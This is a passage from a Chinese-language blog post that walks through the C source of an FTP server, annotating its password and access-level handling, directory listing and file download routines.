CMD: &quot;</span>, <span class="string">&quot;PASS ***&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( cmdno == <span class="number">-1</span> )</span><br><span class="line">        sendstring(&amp;ctx, error500);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( rv &lt;= <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>一个简单的遍历匹配</li>
</ul>
<p>最后单独介绍几个 FTP 命令的实现：</p>
<ul>
<li>匹配密码和登录设置：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ftpPASS</span><span class="params">(PFTPCONTEXT context, <span class="keyword">const</span> <span class="keyword">char</span> *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>	temptext[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( params == <span class="literal">NULL</span> )</span><br><span class="line">        <span class="keyword">return</span> sendstring(context, error501);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(temptext, <span class="number">0</span>, <span class="keyword">sizeof</span>(temptext));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * we have login name saved in context-&gt;FileName from USER command</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (!config_parse(g_cfg.ConfigFile, context-&gt;FileName, <span class="string">&quot;pswd&quot;</span>, temptext, <span class="keyword">sizeof</span>(temptext))) <span class="comment">/* 提取密码 */</span></span><br><span class="line">        <span class="keyword">return</span> sendstring(context, error530_r);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( (<span class="built_in">strcmp</span>(temptext, params) == <span class="number">0</span>) || (temptext[<span class="number">0</span>] == <span class="string">&#x27;*&#x27;</span>) )</span><br><span class="line">    &#123; <span class="comment">/* 密码匹配成功,或者密码设置为&#x27;*&#x27; */</span></span><br><span class="line">        <span class="built_in">memset</span>(context-&gt;RootDir, <span class="number">0</span>, <span class="keyword">sizeof</span>(context-&gt;RootDir));</span><br><span class="line">        <span class="built_in">memset</span>(temptext, <span class="number">0</span>, <span class="keyword">sizeof</span>(temptext));</span><br><span class="line"></span><br><span class="line">        config_parse(g_cfg.ConfigFile, context-&gt;FileName, <span class="string">&quot;root&quot;</span>, context-&gt;RootDir, <span class="keyword">sizeof</span>(context-&gt;RootDir)); <span class="comment">/* 提取根目录路径 */</span></span><br><span class="line">        config_parse(g_cfg.ConfigFile, context-&gt;FileName, <span class="string">&quot;accs&quot;</span>, temptext, <span class="keyword">sizeof</span>(temptext)); <span class="comment">/* 提取登录设置 */</span></span><br><span class="line"></span><br><span class="line">        context-&gt;Access = FTP_ACCESS_NOT_LOGGED_IN;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( strcasecmp(temptext, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> ) &#123; </span><br><span class="line">                <span class="comment">/* 登录设置为&quot;admin&quot;:启用所有功能 */</span></span><br><span class="line">                context-&gt;Access = FTP_ACCESS_FULL;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( strcasecmp(temptext, <span class="string">&quot;upload&quot;</span>) == <span class="number">0</span> ) &#123; </span><br><span class="line">                <span class="comment">/* 登录设置为&quot;upload&quot;:</span></span><br><span class="line"><span class="comment">                允许:创建新目录,存储新文件附加</span></span><br><span class="line"><span class="comment">                禁用:重命名,删除 */</span></span><br><span class="line">                context-&gt;Access = FTP_ACCESS_CREATENEW;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( strcasecmp(temptext, <span class="string">&quot;readonly&quot;</span>) == <span class="number">0</span> ) &#123; </span><br><span class="line">                <span class="comment">/* 登录设置为&quot;readonly&quot;:只需读取目录和下载文件 */</span></span><br><span class="line">                context-&gt;Access = FTP_ACCESS_READONLY;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> sendstring(context, error530_b);</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        writelogentry(context, <span class="string">&quot; PASS-&gt;successful logon&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> sendstring(context, error530_r);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sendstring(context, success230);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>列出目标目录中所有的文件：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ftpLIST</span><span class="params">(PFTPCONTEXT context, <span class="keyword">const</span> <span class="keyword">char</span> *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span>	<span class="title">stat</span>	<span class="title">filestats</span>;</span></span><br><span class="line">    <span class="keyword">pthread_t</span>		tid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (context-&gt;Access == FTP_ACCESS_NOT_LOGGED_IN)</span><br><span class="line">        <span class="keyword">return</span> sendstring(context, error530); </span><br><span class="line">    <span class="keyword">if</span> (context-&gt;WorkerThreadValid == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> sendstring(context, <span class="keyword">error550_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (params != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">strcmp</span>(params, <span class="string">&quot;-a&quot;</span>) == <span class="number">0</span>) || (<span class="built_in">strcmp</span>(params, <span class="string">&quot;-l&quot;</span>) == <span class="number">0</span>))</span><br><span class="line">            params = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ftp_effective_path(context-&gt;RootDir, context-&gt;CurrentDir, params, <span class="keyword">sizeof</span>(context-&gt;FileName), context-&gt;FileName); <span class="comment">/* 通过设置的根目录来获取目标目录的绝对路径(结果存放于context-&gt;FileName) */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (stat(context-&gt;FileName, &amp;filestats) == <span class="number">0</span>)</span><br><span class="line">    &#123; <span class="comment">/* 使用stat函数获取文件信息(已经获取了文件的绝对路径) */</span> </span><br><span class="line">        <span class="keyword">if</span> ( !S_ISDIR(filestats.st_mode) ) <span class="comment">/* filestats.st_mode是否是一个目录 */</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        sendstring(context, interm150);</span><br><span class="line">        writelogentry(context, <span class="string">&quot; LIST&quot;</span>, (<span class="keyword">char</span> *)params);</span><br><span class="line">        context-&gt;WorkerThreadAbort = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        pthread_mutex_lock(&amp;context-&gt;MTLock);</span><br><span class="line"></span><br><span class="line">        context-&gt;WorkerThreadValid = pthread_create(&amp;tid, <span class="literal">NULL</span>, (<span class="keyword">void</span> * (*)(<span class="keyword">void</span> *))list_thread, context); </span><br><span class="line">        <span class="comment">/* 设置一个线程</span></span><br><span class="line"><span class="comment">        用于完成:打开目录,读取文件信息,组织输出等一系列工作 */</span></span><br><span class="line">        <span class="keyword">if</span> ( context-&gt;WorkerThreadValid == <span class="number">0</span> )</span><br><span class="line">            context-&gt;WorkerThreadId = tid;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            sendstring(context, error451);</span><br><span class="line"></span><br><span class="line">        pthread_mutex_unlock(&amp;context-&gt;MTLock);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sendstring(context, error550);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>从服务器上下载目标文件：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ftpRETR</span><span class="params">(PFTPCONTEXT context, <span class="keyword">const</span> <span class="keyword">char</span> *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span>	<span class="title">stat</span>	<span class="title">filestats</span>;</span></span><br><span class="line">    <span class="keyword">pthread_t</span>		tid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (context-&gt;Access == FTP_ACCESS_NOT_LOGGED_IN)</span><br><span class="line">        <span class="keyword">return</span> sendstring(context, error530);</span><br><span class="line">    <span class="keyword">if</span> (context-&gt;WorkerThreadValid == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> sendstring(context, <span class="keyword">error550_t</span>);</span><br><span class="line">    <span class="keyword">if</span> ( params == <span class="literal">NULL</span> )</span><br><span class="line">        <span class="keyword">return</span> sendstring(context, error501);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( context-&gt;File != <span class="number">-1</span> ) &#123;</span><br><span class="line">        close(context-&gt;File);</span><br><span class="line">        context-&gt;File = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ftp_effective_path(context-&gt;RootDir, context-&gt;CurrentDir, params, <span class="keyword">sizeof</span>(context-&gt;FileName), context-&gt;FileName); <span class="comment">/* 获取目标文件的绝对路径 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (stat(context-&gt;FileName, &amp;filestats) == <span class="number">0</span>)</span><br><span class="line">    &#123; <span class="comment">/* 获取该文件的状态 */</span></span><br><span class="line">        <span class="keyword">if</span> ( S_ISDIR(filestats.st_mode) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        sendstring(context, interm150);</span><br><span class="line">        writelogentry(context, <span class="string">&quot; RETR: &quot;</span>, (<span class="keyword">char</span> *)params);</span><br><span class="line">        context-&gt;WorkerThreadAbort = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        pthread_mutex_lock(&amp;context-&gt;MTLock);</span><br><span class="line"></span><br><span class="line">        context-&gt;WorkerThreadValid = pthread_create(&amp;tid, <span class="literal">NULL</span>, (<span class="keyword">void</span> * (*)(<span class="keyword">void</span> *))retr_thread, context); <span class="comment">/* 设置一个线程来完成下载操作 */</span></span><br><span class="line">        <span class="keyword">if</span> ( context-&gt;WorkerThreadValid == <span class="number">0</span> )</span><br><span class="line">            context-&gt;WorkerThreadId = tid;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            sendstring(context, error451);</span><br><span class="line"></span><br><span class="line">        pthread_mutex_unlock(&amp;context-&gt;MTLock);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sendstring(context, error550);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">f = open(context-&gt;FileName, O_RDONLY); <span class="comment">/* 打开目标文件 */</span></span><br><span class="line">context-&gt;File = f;</span><br><span class="line"><span class="keyword">if</span> (f == <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">offset = lseek(f, context-&gt;RestPoint, SEEK_SET); <span class="comment">/* 重新设置文件指针(如果文件过大则需要分多次进行传输) */</span></span><br><span class="line"><span class="keyword">if</span> (offset != context-&gt;RestPoint)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">sent_ok = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> ( context-&gt;WorkerThreadAbort == <span class="number">0</span> ) &#123;</span><br><span class="line">    sz = read(f, buffer, buffer_size); <span class="comment">/* 把文件内容读取到本地内存 */</span></span><br><span class="line">    <span class="keyword">if</span> (sz == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sz &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sent_ok = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (send_auto(clientsocket, TLS_datasession, buffer, sz) == sz) </span><br><span class="line">    &#123; <span class="comment">/* 发送数据到客户端 */</span></span><br><span class="line">        sz_total += sz; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        sent_ok = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/22/">22</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">217</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">12</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">132</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">2.9m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">43:40</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
